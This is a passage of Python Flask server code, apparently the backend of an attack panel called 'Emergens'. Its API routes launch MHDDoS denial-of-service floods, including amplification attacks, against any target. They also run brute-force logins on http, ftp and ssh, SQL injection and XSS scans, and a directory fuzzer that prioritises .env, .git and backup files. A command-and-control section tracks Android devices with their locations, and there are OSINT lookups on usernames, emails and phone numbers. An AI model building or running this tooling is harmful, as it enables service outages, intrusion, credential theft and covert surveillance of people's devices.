    try: result = fetch_source(url, extract=extract)
    except Exception as e: return jsonify({"error": "fetch_failed", "detail": str(e)}), 500
    if "error" in result: return jsonify(result), 500
    return jsonify(result)


# ═══════════════════════════════════════════════════════════════════════════
# AI Chat
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/chat", methods=["POST"])
@role_required("owner", "analyst")
def api_chat():
    data = request.get_json(silent=True) or {}
    return jsonify(chat_handler.send(data.get("message", "")))

@app.route("/api/chat/history")
@api_login_required
def api_chat_history(): return jsonify(chat_handler.get_history())

@app.route("/api/chat/clear", methods=["POST"])
@role_required("owner", "analyst")
def api_chat_clear():
    chat_handler.clear_history(); return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# School search
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/school/search")
@api_login_required
def api_school_search():
    from modules import scan_school
    query = request.args.get("q", "").strip()
    result = scan_school.run(query)
    return jsonify(result["data"])


# ═══════════════════════════════════════════════════════════════════════════
# Telegram
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/telegram/status")
@api_login_required
def api_telegram_status(): return jsonify(get_bot_status())

@app.route("/api/telegram/connect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_connect():
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    username = (data.get("username") or "").strip()
    owner_id = (data.get("owner_id") or "").strip()
    public_mode = data.get("public_mode", True)
    if not token or not username: return jsonify({"error": "token_and_username_required"}), 400
    success, message = connect_bot(token, username, owner_id, public_mode)
    if not success: return jsonify({"error": message}), 500
    return jsonify(get_bot_status())

@app.route("/api/telegram/disconnect", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_disconnect():
    disconnect_bot(); return jsonify({"status": "disconnected"})

@app.route("/api/telegram/update-settings", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_update_settings():
    data = request.get_json(silent=True) or {}
    settings = {}
    if "owner_id" in data: settings["owner_id"] = str(data["owner_id"]).strip()
    if "public_mode" in data: settings["public_mode"] = bool(data["public_mode"])
    if not settings: return jsonify({"error": "no_settings_provided"}), 400
    return jsonify(update_bot_settings(**settings))

@app.route("/api/telegram/broadcast", methods=["POST"])
@role_required("owner", "analyst")
def api_telegram_broadcast():
    data = request.get_json(silent=True) or {}
    message = (data.get("message") or "").strip()
    if not message: return jsonify({"error": "message_required"}), 400
    return jsonify(broadcast_message(message))


# ═══════════════════════════════════════════════════════════════════════════
# Code Test workspace
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/code_test/read")
@api_login_required
def api_read_file():
    if not _testing_available: return jsonify({"error": "Testing module not available"}), 503
    file_path = request.args.get("path", "").strip()
    if not file_path: return jsonify({"error": "path required"}), 400
    return jsonify(code_test_module.read_file(file_path))

@app.route("/api/code_test/write", methods=["POST"])
@api_login_required
def api_write_file():
    if not _testing_available: return jsonify({"error": "Testing module not available"}), 503
    data = request.get_json(silent=True) or {}
    file_path = data.get("file_path", "").strip()
    content = data.get("content", "")
    if not file_path: return jsonify({"error": "file_path required"}), 400
    return jsonify(code_test_module.write_file(file_path, content))

@app.route("/api/code_test/run", methods=["POST"])
@api_login_required
def api_run_code_test():
    if not _testing_available: return jsonify({"error": "Testing module is not installed"}), 503
    data = request.get_json(silent=True) or {}
    code = data.get("code", "")
    if not code: return jsonify({"error": "No code provided"}), 400
    try:
        results = code_test_module.run_tests(code, data.get("test_cases", []))
        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": f"Execution error: {str(e)}"}), 500

@app.route("/api/code_test/files")
@api_login_required
def api_list_code_test_files():
    if not _testing_available: return jsonify({"error": "Testing module not available"}), 503
    try: return jsonify({"files": code_test_module.list_project_files()})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/code_test/backup", methods=["POST"])
@api_login_required
def api_backup_file():
    if not _testing_available: return jsonify({"error": "Testing module not available"}), 503
    data = request.get_json(silent=True) or {}
    file_path = data.get("file_path")
    if not file_path: return jsonify({"error": "file_path required"}), 400
    return jsonify(code_test_module.backup_file(file_path))

@app.route("/api/code_test/backup_all", methods=["POST"])
@api_login_required
def api_backup_all():
    if not _testing_available: return jsonify({"error": "Testing module not available"}), 503
    return jsonify(code_test_module.backup_all_source_files())

@app.route("/api/code_test/workspace_info")
@api_login_required
def api_workspace_info():
    if not _testing_available: return jsonify({"error": "Testing module not available"}), 503
    return jsonify(code_test_module.get_workspace_info())

@app.route("/api/code_test/scan", methods=["POST"])
@api_login_required
def api_code_test_scan():
    data = request.get_json(silent=True) or {}
    target = (data.get("target") or "").strip()
    mode = data.get("mode", "basic")
    tools = data.get("tools", [])
    if not target: return jsonify({"error": "target_required"}), 400
    if mode not in ("basic", "expert"): mode = "basic"
    return jsonify({"job_id": scan_orchestrator.start_scan(target, mode, tools, history_store)})


# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS Attack Panel
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/mhddos/methods")
@login_required
def mhddos_methods():
    return jsonify({
        "available": True,
        "methods": sorted(_MHDDOS_METHODS),
        "layer7": sorted(_MHDDOS_LAYER7),
        "layer4": sorted(_MHDDOS_LAYER4),
        "amplification": sorted(_MHDDOS_AMP),
        "proxy_files": sorted(ALLOWED_PROXY_FILES),
        "reflector_files": sorted(ALLOWED_REFLECTOR_FILES),
    })

@app.route("/api/mhddos/start", methods=["POST"])
@login_required
def mhddos_start():
    data = request.get_json(silent=True) or {}
    method = (data.get("method") or "").strip().upper()
    target = (data.get("target") or "").strip()
    threads = int(data.get("threads", 10))
    duration = int(data.get("duration", 60))
    proxy_type = int(data.get("proxy_type", 0))
    proxy_file = Path((data.get("proxy_file") or "proxies.txt").strip()).name
    rpc = int(data.get("rpc", 1))
    reflector_file = Path((data.get("reflector_file") or "").strip()).name
    debug = bool(data.get("debug", False))

    if not method or not target: return jsonify({"error": "method and target are required"}), 400
    if method not in _MHDDOS_METHODS: return jsonify({"error": f"Unknown method: {method}"}), 400
    if threads < 1 or threads > 1000: return jsonify({"error": "threads must be between 1 and 1000"}), 400
    if duration < 1 or duration > 3600: return jsonify({"error": "duration must be between 1 and 3600 seconds"}), 400
    if proxy_type not in VALID_PROXY_TYPES:
        return jsonify({"error": "invalid proxy_type", "allowed": sorted(VALID_PROXY_TYPES)}), 400
    if method not in _MHDDOS_AMP and proxy_file not in ALLOWED_PROXY_FILES:
        return jsonify({"error": "invalid proxy_file", "allowed": sorted(ALLOWED_PROXY_FILES)}), 400
    if method in _MHDDOS_AMP and reflector_file and reflector_file not in ALLOWED_REFLECTOR_FILES:
        return jsonify({"error": "invalid reflector_file", "allowed": sorted(ALLOWED_REFLECTOR_FILES)}), 400
    if method in _MHDDOS_LAYER7:
        missing = [str(p) for p in REQUIRED_L7_FILES if not (Path(PROJECT_ROOT) / p).exists()]
        if missing:
            return jsonify({"error": "engine_missing_files",
                            "detail": f"start.py requires these files for L7: {', '.join(missing)}"}), 500

    attack_id = "MHD-" + uuid.uuid4().hex[:8].upper()
    result = _mhddos_start_attack(attack_id, method, target, threads, duration,
                                  proxy_type, proxy_file, rpc, reflector_file, debug)
    return jsonify(result), (201 if result.get("success") else 500)

@app.route("/api/mhddos/stop", methods=["POST"])
@login_required
def mhddos_stop():
    data = request.get_json(silent=True) or {}
    attack_id = (data.get("attack_id") or "").strip()
    if not attack_id: return jsonify({"error": "attack_id required"}), 400
    result = _mhddos_stop_attack(attack_id)
    return jsonify(result), (200 if result.get("success") else 404)

@app.route("/api/mhddos/stop_all", methods=["POST"])
@login_required
def mhddos_stop_all(): return jsonify(_mhddos_stop_all())

@app.route("/api/mhddos/status")
@login_required
def mhddos_status():
    attack_id = request.args.get("attack_id", "").strip()
    status = _mhddos_get_status(attack_id or None)
    if attack_id and status is None: return jsonify({"error": "Attack not found"}), 404
    return jsonify(status)

@app.route("/api/mhddos/history")
@login_required
def mhddos_history():
    limit = min(request.args.get("limit", 50, type=int), 200)
    with _mhddos_lock:
        snapshot = list(_mhddos_history[-limit:])
    return jsonify({"history": [_serialise_mhddos_entry(h) for h in snapshot]})

@app.route("/api/mhddos/log/<attack_id>")
@login_required
def mhddos_log(attack_id):
    attack_id = attack_id.strip()
    if not re.match(r"^MHD-[A-Z0-9]{8}$", attack_id):
        return jsonify({"error": "invalid attack_id"}), 400
    with _mhddos_lock:
        entry = _mhddos_processes.get(attack_id)
    log_path = None
    if entry and entry.get("log_path"): log_path = entry["log_path"]
    else:
        candidate = _MHDDOS_LOG_DIR / f"{attack_id}.log"
        if candidate.exists(): log_path = str(candidate)
    if not log_path or not Path(log_path).exists():
        return jsonify({"error": "log_not_found", "attack_id": attack_id}), 404
    lines = min(int(request.args.get("lines", 200)), 2000)
    return jsonify({"attack_id": attack_id, "log_path": log_path,
                    "lines": _mhddos_read_log_tail(log_path, lines).splitlines()})

@app.route("/api/mhddos/command", methods=["POST"])
@login_required
def mhddos_preview_command():
    data = request.get_json(silent=True) or {}
    method = (data.get("method") or "").strip().upper()
    target = (data.get("target") or "").strip()
    if method not in _MHDDOS_METHODS or not target:
        return jsonify({"error": "valid method and target required"}), 400
    cmd = _mhddos_build_command(
        method=method, target=target,
        threads=int(data.get("threads", 10)), duration=int(data.get("duration", 60)),
        proxy_type=int(data.get("proxy_type", 0)),
        proxy_file=(data.get("proxy_file") or "proxies.txt"),
        rpc=int(data.get("rpc", 1)),
        reflector_file=(data.get("reflector_file") or ""),
        debug=bool(data.get("debug", False)))
    layer = "L7" if method in _MHDDOS_LAYER7 else "L4"
    return jsonify({"layer": layer, "amplification": method in _MHDDOS_AMP,
                    "argv": cmd, "argv_after_script": cmd[2:]})


# ═══════════════════════════════════════════════════════════════════════════
# EXPLOIT SUITE — Directory Fuzzer + Wordlist management
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/wordlists")
@login_required
def api_exploit_wordlists():
    """List every .txt wordlist in wordlist/ with line count and size."""
    return jsonify({
        "directory": str(WORDLIST_DIR),
        "wordlists": _list_wordlists(),
    })


@app.route("/api/exploit/wordlists/<name>")
@login_required
def api_exploit_wordlist_preview(name):
    """Return the first N lines of a specific wordlist for UI preview."""
    limit = min(int(request.args.get("lines", 100)), 500)
    lines, err = _load_wordlist(name, max_lines=limit)
    if err:
        return jsonify({"error": err}), 404
    return jsonify({"name": Path(name).name, "count": len(lines), "lines": lines})


@app.route("/api/exploit/dirfuzz", methods=["POST"])
@login_required
def api_exploit_dirfuzz():
    """Probe a wordlist of paths against a target base URL using a threadpool.

    Body parameters:
      base          — target base URL (required)
      wordlist_name — file in wordlist/ (e.g. cvePaths.txt)
      wordlist      — inline array of paths (fallback)
      filter        — 'all' | '200' | '3xx' | '403'
      max_paths     — hard cap on how many paths to try (default 500)
    """
    from concurrent.futures import ThreadPoolExecutor
    import requests as _rq

    body = request.get_json(silent=True) or {}
    base = (body.get("base") or "").strip().rstrip("/")
    wordlist_name = (body.get("wordlist_name") or "").strip()
    inline_wordlist = body.get("wordlist") or []
    status_filter = (body.get("filter") or "all").strip()
    max_paths = int(body.get("max_paths", 500))

    if not base:
        return jsonify({"error": "base URL required"}), 400
    if not base.startswith(("http://", "https://")):
        base = "http://" + base

    source_label = ""
    wordlist = []
    if wordlist_name:
        loaded, err = _load_wordlist(wordlist_name, max_lines=max_paths)
        if err:
            return jsonify({"error": err,
                            "available": [w["name"] for w in _list_wordlists()]}), 404
        wordlist = loaded
        source_label = Path(wordlist_name).name
    elif isinstance(inline_wordlist, list) and inline_wordlist:
        wordlist = [str(w).strip().lstrip("/") for w in inline_wordlist if str(w).strip()][:max_paths]
        source_label = "inline"
    else:
        return jsonify({
            "error": "no wordlist provided",
            "hint": "Pass either wordlist_name (file in wordlist/) or wordlist (array).",
            "available": [w["name"] for w in _list_wordlists()],
        }), 400

    if not wordlist:
        return jsonify({"error": "wordlist is empty", "source": source_label}), 400

    headers = {"User-Agent": "Emergens-ExploitSuite/3.9"}
    timeout = 5
    hits = []

    def _probe(path):
        url = f"{base}/{path}"
        try:
            r = _rq.get(url, headers=headers, timeout=timeout,
                        allow_redirects=False, stream=True)
            status = r.status_code
            size = r.headers.get("Content-Length") or 0
            r.close()
            return {"path": "/" + path, "status": status, "size": size}
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=16) as pool:
        for result in pool.map(_probe, wordlist):
            if not result:
                continue
            s = result["status"]
            if s == 404: continue
            if status_filter == "200" and s != 200: continue
            if status_filter == "3xx" and not (300 <= s < 400): continue
            if status_filter == "403" and s != 403: continue
            hits.append(result)

    def _rank(h):
        p = h["path"].lower()
        if any(x in p for x in (".env", ".git", "backup", "dump", ".sql", ".bak", "config")):
            return 0
        if h["status"] in (401, 403): return 1
        if h["status"] == 200: return 2
        return 3
    hits.sort(key=_rank)

    return jsonify({
        "base": base,
        "source": source_label,
        "tried": len(wordlist),
        "hits": hits,
    })


@app.route("/api/exploit/takeover", methods=["POST"])
@login_required
def api_exploit_takeover():
    """Stub — implement CNAME enumeration here for full takeover scanning."""
    body = request.get_json(silent=True) or {}
    domain = (body.get("domain") or "").strip()
    if not domain:
        return jsonify({"error": "domain required"}), 400
    return jsonify({"candidates": [], "dangling": []})


# ═══════════════════════════════════════════════════════════════════════════
# Remote Access / C2
# ═══════════════════════════════════════════════════════════════════════════
_lock_state = {"locked": True, "locked_by": None, "locked_at": None}
_c2_devices = []
_c2_activities = []
_c2_lock = threading.Lock()

@app.route("/api/c2/status")
@login_required
def c2_status():
    return jsonify({"authenticated": True, "username": session.get("username"),
                    "role": session.get("role"), "lock_state": _lock_state})

@app.route("/api/c2/toggle_lock", methods=["POST"])
@login_required
def c2_toggle_lock():
    with _c2_lock:
        _lock_state["locked"] = not _lock_state["locked"]
        if _lock_state["locked"]:
            _lock_state["locked_by"] = session.get("username")
            _lock_state["locked_at"] = datetime.now(timezone.utc).isoformat()
        else:
            _lock_state["locked_by"] = None
            _lock_state["locked_at"] = None
        return jsonify({"success": True, "lock_state": _lock_state})

@app.route("/api/c2/devices")
@login_required
def c2_devices(): return jsonify({"devices": _c2_devices})

@app.route("/api/c2/activities")
@login_required
def c2_activities():
    limit = min(request.args.get("limit", 50, type=int), 200)
    return jsonify({"activities": _c2_activities[-limit:]})

@app.route("/api/c2/register_device", methods=["POST"])
@login_required
def c2_register_device():
    data = request.get_json(silent=True) or {}
    device_id = data.get("id", "").strip()
    if not device_id: return jsonify({"error": "Device ID is required"}), 400
    device = {
        "id": device_id, "name": data.get("name", device_id),
        "model": data.get("model", ""), "serial": data.get("serial", ""),
        "android": data.get("android", ""), "status": "online",
        "battery": data.get("battery"), "location": data.get("location", ""),
        "temperature": data.get("temperature", ""),
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    with _c2_lock:
        for i, d in enumerate(_c2_devices):
            if d["id"] == device_id:
                _c2_devices[i] = device; break
        else: _c2_devices.append(device)
    return jsonify({"success": True, "device": device})

@app.route("/api/c2/log_activity", methods=["POST"])
@login_required
def c2_log_activity():
    data = request.get_json(silent=True) or {}
    device_id = data.get("device_id", "").strip()
    action = data.get("action", "").strip()
    if not device_id or not action: return jsonify({"error": "device_id and action are required"}), 400
    device_name = next((d["name"] for d in _c2_devices if d["id"] == device_id), device_id)
    with _c2_lock:
        _c2_activities.append({
            "device_id": device_id, "device_name": device_name,
            "action": action,
            "timestamp": data.get("timestamp") or datetime.now(timezone.utc).isoformat(),
        })
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# Exploit / Analytic endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/exploit/stats")
@login_required
def api_exploit_stats():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    try: return jsonify(AnalyticDataManager().get_statistics())
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/exploit/list")
@login_required
def api_exploit_list():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    try:
        return jsonify({"exploits": AnalyticDataManager().list_exploits(
            category=request.args.get("category"), service=request.args.get("service"))})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/exploit/search", methods=["POST"])
@login_required
def api_exploit_search():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    query = data.get("query", "")
    if not query: return jsonify({"error": "Query required"}), 400
    try: return jsonify({"exploits": AnalyticDataManager().search_exploits(query)})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/exploit/bruteforce", methods=["POST"])
@login_required
def api_exploit_bruteforce():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    target = data.get("target", "").strip()
    if not target: return jsonify({"error": "Target required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_brute_force(
            target, data.get("protocols", ["http", "ftp", "ssh"]),
            data.get("username_file", "data1.txt"),
            data.get("password_file", "data1.txt"))})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/exploit/bruteforce/stop", methods=["POST"])
@login_required
def api_exploit_bruteforce_stop():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    try:
        AnalyticDataManager().stop_brute_force()
        return jsonify({"success": True})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/exploit/sql_inject", methods=["POST"])
@login_required
def api_exploit_sql_inject():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url: return jsonify({"error": "URL required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_sql_injection_scan(
            url, data.get("method", "GET"), data.get("params"))})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/exploit/xss", methods=["POST"])
@login_required
def api_exploit_xss():
    if not _analytic_available: return jsonify({"error": "Analytic data module not available"}), 503
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url: return jsonify({"error": "URL required"}), 400
    try:
        return jsonify({"results": AnalyticDataManager().run_xss_scan(
            url, data.get("method", "GET"), data.get("params"))})
    except Exception as e: return jsonify({"error": str(e)}), 500


# ═══════════════════════════════════════════════════════════════════════════
# 404 handler
# ═══════════════════════════════════════════════════════════════════════════
@app.errorhandler(404)
def page_not_found(e):
    username = session.get("username") if session.get("authenticated") else "Guest"
    html = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LOST AREA</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background-color: #000; color: #fff; font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
  display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh;
  position: relative; overflow: hidden; }
body::before { content: ""; position: absolute; inset: 0;
  background: radial-gradient(ellipse at center, rgba(255,255,255,0.04) 0%, transparent 70%);
  animation: pulse 4s ease-in-out infinite; pointer-events: none; }
@keyframes pulse { 0%, 100% { opacity: .5; transform: scale(1); } 50% { opacity: 1; transform: scale(1.08); } }
@keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
.center-content { display: flex; flex-direction: column; align-items: center; justify-content: center;
  flex: 1; animation: fadeIn 1.5s ease-out; }
.username { font-size: .9rem; letter-spacing: .2em; color: #aaa; text-transform: uppercase; margin-bottom: 10px; }
.main-title { font-size: clamp(1.2rem, 3.5vw, 2.5rem); font-weight: 300; letter-spacing: .35em;
  text-align: center; text-transform: uppercase; text-shadow: 0 0 30px rgba(255,255,255,.15); }
.bottom-bar { position: absolute; bottom: 20px; left: 0; right: 0; text-align: center; padding: 15px; }
.url-not-found { font-size: .8rem; letter-spacing: .25em; color: #888; text-transform: uppercase; }
.url-address { font-size: .7rem; letter-spacing: .1em; color: #aaa; margin-top: 8px; word-break: break-all; }
</style></head>
<body>
<div class="center-content">
  <div class="username">__USERNAME__</div>
  <div class="main-title">Lost Area</div>
</div>
<div class="bottom-bar">
  <div class="url-not-found">URL Not Found</div>
  <div class="url-address" id="currentUrl"></div>
</div>
<script>document.getElementById('currentUrl').textContent = window.location.href;</script>
</body></html>"""
    return html.replace("__USERNAME__", username), 404


# ═══════════════════════════════════════════════════════════════════════════
# Emergens additional endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/api/settings/server-name', methods=['GET', 'POST'])
@login_required
def server_name():
    if request.method == 'GET':
        settings = _load_json('settings', {})
        return jsonify({'name': settings.get('server_name', '')})
    u = current_user()
    if u and u.get('role') != 'owner': return jsonify({'error': 'Owner access required'}), 403
    body = request.get_json(silent=True) or {}
    with _json_lock('settings'):
        settings = _load_json('settings', {})
        settings['server_name'] = (body.get('name') or '').strip()
        _save_json('settings', settings)
    logger.info(f'Server name set to "{settings["server_name"]}" by "{session.get("username")}"')
    return jsonify({'name': settings['server_name']})

@app.route('/api/settings/servers')
@owner_required
def panel_manager(): return jsonify(_load_json('servers', []))

ALLOWED_IMAGE_TYPES = {'image/png', 'image/jpeg', 'image/gif', 'image/webp'}

@app.route('/api/profile/photo', methods=['POST'])
@login_required
def profile_photo():
    u = current_user()
    if not u: return jsonify({'error': 'Not authenticated'}), 401
    body = request.get_json(silent=True) or {}
    with _json_lock('profiles'):
        profiles = _load_json('profiles', {})
        profile = profiles.setdefault(u['username'], {})
        if body.get('remove'):
            profile['avatar_url'] = None
            _save_json('profiles', profiles)
            return jsonify({'ok': True, 'avatar_url': None})
        if body.get('url'):
            url = body['url'].strip()
            if not (url.startswith('http://') or url.startswith('https://')):
                return jsonify({'error': 'Please provide a valid http(s) image URL.'}), 400
            profile['avatar_url'] = url
            _save_json('profiles', profiles)
            return jsonify({'ok': True, 'avatar_url': url})
        if body.get('image_base64'):
            data_url = body['image_base64']
            try:
                header, encoded = data_url.split(',', 1)
                mime = header.split(';')[0].replace('data:', '')
                if mime not in ALLOWED_IMAGE_TYPES: return jsonify({'error': 'Unsupported image type.'}), 400
                raw = base64.b64decode(encoded)
                if len(raw) > 5 * 1024 * 1024: return jsonify({'error': 'Image is too large (max 5MB).'}), 400
                ext = mime.split('/')[1]
                filename = f'{u["username"]}_{uuid.uuid4().hex[:8]}.{ext}'
                with open(os.path.join(UPLOAD_DIR, filename), 'wb') as f: f.write(raw)
                profile['avatar_url'] = f'/api/profile/photo/{filename}'
                _save_json('profiles', profiles)
                return jsonify({'ok': True, 'avatar_url': profile['avatar_url']})
            except (ValueError, binascii.Error):
                return jsonify({'error': 'Could not decode that image.'}), 400
    return jsonify({'error': 'Provide image_base64, url, or remove:true.'}), 400

@app.route('/api/profile/photo/<path:filename>')
def serve_profile_photo(filename): return send_from_directory(UPLOAD_DIR, filename)


# ═══════════════════════════════════════════════════════════════════════════
# Global Chat
# ═══════════════════════════════════════════════════════════════════════════
CHAT_HISTORY_LIMIT = 300
_chat_cache = {'data': None, 'mtime': 0.0}
_chat_cache_lock = threading.Lock()

def _get_chat_cached():
    path = os.path.join(DATA_DIR, 'chat.json')
    try: mtime = os.path.getmtime(path)
    except OSError: return {'messages': [], 'locked': False}
    with _chat_cache_lock:
        if _chat_cache['data'] is not None and _chat_cache['mtime'] == mtime:
            return _chat_cache['data']
    data = _load_json('chat', {'messages': [], 'locked': False})
    with _chat_cache_lock:
        _chat_cache['data'] = data; _chat_cache['mtime'] = mtime
    return data

@app.route('/api/chat/messages')
@login_required
def chat_messages():
    chat = _get_chat_cached()
    profiles = _load_json('profiles', {})
    users_by_name = {u['username']: u for u in _load_json('users', [])}
    enriched = []
    for m in chat.get('messages', []):
        u = users_by_name.get(m.get('username'))
        enriched.append({**m,
            'role': u.get('role') if u else m.get('role', '--'),
            'avatar_url': profiles.get(m.get('username'), {}).get('avatar_url')})
    return jsonify({'messages': enriched, 'locked': chat.get('locked', False)})

@app.route('/api/chat/send', methods=['POST'])
@login_required
def chat_send():
    u = current_user()
    if not u: return jsonify({'error': 'Not authenticated'}), 401
    body = request.get_json(silent=True) or {}
    text = (body.get('text') or '').strip()
    if not text: return jsonify({'error': 'Message text is required.'}), 400
    text = text[:500]
    with _json_lock('chat'):
        chat = _load_json('chat', {'messages': [], 'locked': False})
        if chat.get('locked') and u.get('role') != 'owner':
            return jsonify({'error': 'Chat is locked by the Owner.'}), 423
        message = {'id': uuid.uuid4().hex, 'username': u['username'],
                   'role': u['role'], 'text': text, 'timestamp': _now_iso()}
        chat['messages'].append(message)
        chat['messages'] = chat['messages'][-CHAT_HISTORY_LIMIT:]
        _save_json('chat', chat)
    return jsonify({'ok': True, 'id': message['id']})

@app.route('/api/chat/lock', methods=['POST'])
@owner_required
def chat_lock():
    body = request.get_json(silent=True) or {}
    with _json_lock('chat'):
        chat = _load_json('chat', {'messages': [], 'locked': False})
        chat['locked'] = bool(body.get('locked'))
        chat['messages'].append({
            'id': uuid.uuid4().hex, 'is_system': True,
            'text': f'{session.get("username")} {"locked" if chat["locked"] else "unlocked"} Global Chat.',
            'timestamp': _now_iso(),
        })
        _save_json('chat', chat)
    return jsonify({'ok': True, 'locked': chat['locked']})


# ═══════════════════════════════════════════════════════════════════════════
# OSINT module contract
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/api/osint/search', methods=['POST'])
@login_required
def osint_search():
    body = request.get_json(silent=True) or {}
    method = body.get('method')
    query = (body.get('query') or '').strip()
    if method not in ('username', 'email', 'number') or not query:
        return jsonify({'error': 'method and query are required.'}), 400
    try: osint_module = import_module('modules.osint')
    except ModuleNotFoundError:
        return jsonify({'error': 'modules/osint.py not found on the server yet.'}), 404
    try: results = osint_module.search(method, query)
    except Exception as e:
        logger.error(f'modules.osint.search raised: {e}')
        return jsonify({'error': f'OSINT module error: {e}'}), 500
    logger.info(f'OSINT search ({method}) by "{session.get("username")}": {query}')
    return jsonify({'sources': results})


# ═══════════════════════════════════════════════════════════════════════════
# External API v1
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/api/v1/ping', methods=['POST'])
@_api_key_required
def v1_ping():
    return jsonify({'ok': True, 'server_time': _now_iso(), 'owner': g.api_key_owner})

@app.route('/api/v1/scan', methods=['POST'])
@_api_key_required
def v1_scan_start():
    body = request.get_json(silent=True) or {}
    target = (body.get('target') or '').strip()
    mode = body.get('mode') or 'basic'
    tools = body.get('tools') or []
    if not target: return jsonify({'error': 'A target is required.'}), 400
    return jsonify({'job_id': scan_orchestrator.start_scan(target, mode, tools, history_store)})

@app.route('/api/v1/scan/<job_id>')
@_api_key_required
def v1_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None: return jsonify({'error': 'not_found'}), 404
    return jsonify(progress)


# ═══════════════════════════════════════════════════════════════════════════
# Startup helpers
# ═══════════════════════════════════════════════════════════════════════════
def _ensure_engine_layout():
    """Create the folders + seed files start.py expects on first run."""
    files_dir = Path(PROJECT_ROOT) / "files"
    proxies_dir = files_dir / "proxies"
    proxies_dir.mkdir(parents=True, exist_ok=True)
    _MHDDOS_LOG_DIR.mkdir(parents=True, exist_ok=True)

    config_path = Path(PROJECT_ROOT) / "config.json"
    if not config_path.exists():
        config_path.write_text(
            json.dumps({"proxy-providers": [], "MINECRAFT_DEFAULT_PROTOCOL": 758}, indent=2),
            encoding="utf-8")

    for name in ALLOWED_PROXY_FILES:
        p = proxies_dir / name
        if not p.exists(): p.write_text("", encoding="utf-8")

    for name in ALLOWED_REFLECTOR_FILES:
        p = files_dir / name
        if not p.exists(): p.write_text("", encoding="utf-8")

    ua_path = files_dir / "useragent.txt"
    if not ua_path.exists() or not ua_path.read_text(encoding="utf-8", errors="ignore").strip():
        ua_path.write_text(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\n",
            encoding="utf-8")

    ref_path = files_dir / "referers.txt"
    if not ref_path.exists() or not ref_path.read_text(encoding="utf-8", errors="ignore").strip():
        ref_path.write_text(
            "https://www.google.com/\nhttps://www.bing.com/\nhttps://duckduckgo.com/\n",
            encoding="utf-8")


def _print_startup(port=None):
    print(BANNER, flush=True)
    info_lines = []
    if port is not None: info_lines.append(f"  Server     : http://localhost:{port}")
    info_lines.append(f"  Tools      : {len(scan_orchestrator.list_tools())} loaded")
    info_lines.append(f"  Account    : {DEFAULT_USERNAME}")
    info_lines.append(f"  MHDDoS     : {'ready' if MHDDOS_SCRIPT.exists() else 'start.py missing'}")
    info_lines.append(f"  Engine py  : {PYTHON_EXE}")
    info_lines.append(f"  Attack log : {_MHDDOS_LOG_DIR}")
    wl = _list_wordlists()
    info_lines.append(f"  Wordlists  : {len(wl)} file(s) in {WORDLIST_DIR.name}/")
    for w in wl:
        info_lines.append(f"               • {w['name']}  ({w['count']} lines)")
    print("\n".join(info_lines), flush=True)
    print(flush=True)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "reset-password":
        existing_role = get_role(DEFAULT_USERNAME) or "owner"
        new_password = create_user(DEFAULT_USERNAME, role=existing_role)
        print(BANNER, flush=True)
        print(f"  Password reset for '{DEFAULT_USERNAME}' (role={existing_role})", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Copy it now — it will not be shown again.", flush=True)
        sys.exit(0)

    new_password = ensure_default_user()
    if new_password:
        print(BANNER, flush=True)
        print("  First run — account created automatically", flush=True)
        print(f"  Username: {DEFAULT_USERNAME}", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Role:     owner", flush=True)
        print("  Save this password now — you will need it to log in.", flush=True)
        print(flush=True)

    auto_restart_bot()
    _ensure_engine_layout()
    _ensure_wordlist_dir()

    default_port = int(Config.PORT) if hasattr(Config, 'PORT') else 8080
    while True:
        try:
            port_input = input(f"Enter port (default {default_port}, press Enter for default): ").strip()
            if port_input == "": port = default_port; break
            port = int(port_input)
